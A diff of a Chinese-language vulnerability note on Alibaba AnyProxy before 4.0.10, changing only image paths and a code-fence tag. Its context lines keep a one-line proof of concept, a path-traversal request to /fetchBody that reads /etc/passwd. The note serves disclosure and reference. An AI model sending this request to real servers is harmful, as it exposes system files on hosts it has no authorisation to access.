@@ -20,17 +20,12 @@ Alibaba AnyProxy < 4.0.10
 
 页面如下
 
-![](images/202202102008909.png)
-
-
+![](../.gitbook/assets/202202102008909.png)
 
 验证POC为
 
-```plain
+```
 /fetchBody?id=1/../../../../../../../../etc/passwd
 ```
 
-
-
-![](images/202202102008683.png)
-
+![](../.gitbook/assets/202202102008683.png)
